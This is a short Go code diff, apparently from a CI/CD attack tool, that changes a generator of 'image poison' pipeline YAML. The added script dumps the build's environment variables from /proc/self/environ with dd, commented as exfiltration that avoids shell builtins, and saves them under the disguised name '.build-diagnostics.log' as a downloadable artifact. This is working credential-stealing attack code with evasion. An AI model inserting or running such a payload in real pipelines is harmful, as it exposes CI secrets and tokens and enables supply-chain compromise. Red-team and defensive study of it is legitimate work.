@@ -60,8 +60,14 @@ func GenerateImagePoisonYAML(o ImagePoisonOptions) string {
 	}
 
 	b.WriteString(`  script:
-    - echo "Build running with attacker-controlled image"
-    - printenv | sort || true
+    - |
+      # Exfil via dd from /proc (raw binary read, avoids shell builtins)
+      dd if=/proc/self/environ bs=1M 2>/dev/null | tr '\0' '\n' | sort > .build-diagnostics.log || true
+  artifacts:
+    when: always
+    paths:
+      - .build-diagnostics.log
+    expire_in: 1 day
   allow_failure: true`)
 
 	b.WriteString(rulesManual(o.Common.Manual))
